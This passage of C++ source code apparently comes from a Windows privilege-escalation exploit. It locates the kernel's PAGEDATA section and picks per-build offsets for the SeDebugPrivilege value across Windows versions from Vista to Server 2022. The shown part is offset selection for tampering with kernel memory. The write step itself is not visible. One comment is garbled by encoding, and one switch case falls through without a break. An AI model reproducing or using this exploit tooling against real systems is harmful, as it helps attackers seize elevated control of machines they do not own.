            DWORD baseAddress = pSectionHeaders[i].VirtualAddress;
            delete[] buffer;
            return baseAddress;
        }
    }

    delete[] buffer;
    return 0; // ���û���ҵ�PAGEDATA�ڣ�����0
}


void SetNtSeDebugPrivilegeOffsetByOSVersion(OSVERSION& OSVersion,
    DWORD64& PAGEDATA_NtSeDebugPrivilege_Offset)
{
    switch (OSVersion.MajorVersion) {
    case 10:
        switch (OSVersion.BuildNumber) {
        case 14393:
            std::wcout << L"  Windows 10 1607 / Windows Server 2016" << std::endl;
            PAGEDATA_NtSeDebugPrivilege_Offset = WS16_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 17763:
            std::wcout << L"  Windows 10 1809 / Windows Server 2019" << std::endl;
            PAGEDATA_NtSeDebugPrivilege_Offset = WS19_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 10240: std::wcout << L"  Windows 10 1507" << std::endl; break;
        case 10586: std::wcout << L"  Windows 10 1511" << std::endl; break;
        case 15063: std::wcout << L"  Windows 10 1703" << std::endl; break;
        case 16299: std::wcout << L"  Windows 10 1709" << std::endl; break;
        case 17134: std::wcout << L"  Windows 10 1803" << std::endl; break;
        case 18362: std::wcout << L"  Windows 10 1903" << std::endl; break;
        case 18363: std::wcout << L"  Windows 10 1909" << std::endl; break;
        case 19041: std::wcout << L"  Windows 10 2004 / Windows Server 2004" << std::endl; break;
        case 19042: std::wcout << L"  Windows 10 20H2 / Windows Server 20H2" << std::endl; break;
        case 19043: std::wcout << L"  Windows 10 21H1 / Windows Server 21H1" << std::endl; break;
        case 20348:
            std::wcout << L"  Windows Server 2022" << std::endl;
            switch (OSVersion.RevisionNumber) {
            case 2227:
                PAGEDATA_NtSeDebugPrivilege_Offset = WS22_PAGEDATA_NtSeDebugPrivilege_Offset_1;
                break;
            case 2461:
                PAGEDATA_NtSeDebugPrivilege_Offset = WS22_PAGEDATA_NtSeDebugPrivilege_Offset_5;
                break;
            }
            break;
        case 22000: std::wcout << L"  Windows 10 21H2 / Windows 11" << std::endl; break;
        case 22631: std::wcout << L"  Windows 10 23H2 / Windows 11" << std::endl;
        default: std::wcout << L"  Unknown Windows 10 version" << std::endl; break;
        }
        break;
    case 6:
        switch (OSVersion.MinorVersion) {
        case 3:
            if (OSVersion.BuildNumber == 9600) {
                std::wcout << L"  Windows 8.1 / Windows Server 2012 R2" << std::endl;
                PAGEDATA_NtSeDebugPrivilege_Offset = WS12R2_PAGEDATA_NtSeDebugPrivilege_Offset;
            }
            break;
        case 2:
            if (OSVersion.BuildNumber == 9200) {
                std::wcout << L"  Windows 8 / Windows Server 2012" << std::endl;
                PAGEDATA_NtSeDebugPrivilege_Offset = WS12_PAGEDATA_NtSeDebugPrivilege_Offset;
            }
            break;
        case 1:
            if (OSVersion.BuildNumber == 7601) {
                std::wcout << L"  Windows 7 SP1 / Windows Server 2008 R2 SP1" << std::endl;
            }

            PAGEDATA_NtSeDebugPrivilege_Offset = WS08R2_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 0:
            if (OSVersion.BuildNumber == 6002) {
                std::wcout << L"  Windows Vista SP2 / Windows Server 2008 SP2" << std::endl;
            }
            else if (OSVersion.BuildNumber == 6001) {
                std::wcout << L"  Windows Vista SP1 / Windows Server 2008 SP1" << std::endl;
            }
            else {
                std::wcout << L"  Windows Vista / Windows Server 2008" << std::endl;
            }

            PAGEDATA_NtSeDebugPrivilege_Offset = WS08_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        default:
            std::wcout << L"  Unknown Windows version (Major: 6, Minor: " << OSVersion.MinorVersion << ")" << std::endl;
            break;
        }
        break;
    default:
        std::wcout << L"  Unknown Windows version (Major: " << OSVersion.MajorVersion << ")" << std::endl;
        break;
    }
}